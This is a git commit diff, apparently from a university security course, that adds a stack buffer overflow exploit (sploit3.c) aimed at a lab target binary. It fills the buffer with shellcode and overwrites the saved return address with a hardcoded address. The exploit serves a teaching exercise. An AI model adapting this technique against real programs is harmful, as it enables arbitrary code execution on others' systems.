8e1c85c0e35efb4e37ae5c96969befb5469d1b37
Eva Bernal <e.bernal@mail.utoronto.ca>
2020-01-29 18:19:33 -0500

    added waltons sploit 3 code

--- sploits/sploit3.c
+++ sploits/sploit3.c
@@ -5,15 +5,34 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target3"
+#define BUF_START 0x2021fe14
+#define SHELL_LENGTH 45
+#define BUFSIZE 73
 
 int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
+	
+	char attack[BUFSIZE];
+	int i;
+
+	for (i = 0; i < BUFSIZE; i++) {
+		attack[i] = 0xFF;
+	}
+
+	for (i=0; i < SHELL_LENGTH; i++) {
+		attack[i] = shellcode[i];
+	}
+
+	int* ret = (int*) (attack + 68);
+	*ret = BUF_START;
+
+	attack[BUFSIZE-1] = '\0';
 
 	args[0] = TARGET;
-	args[1] = "hi there";
+	args[1] = attack;
 	args[2] = NULL;
 
 	env[0] = NULL;
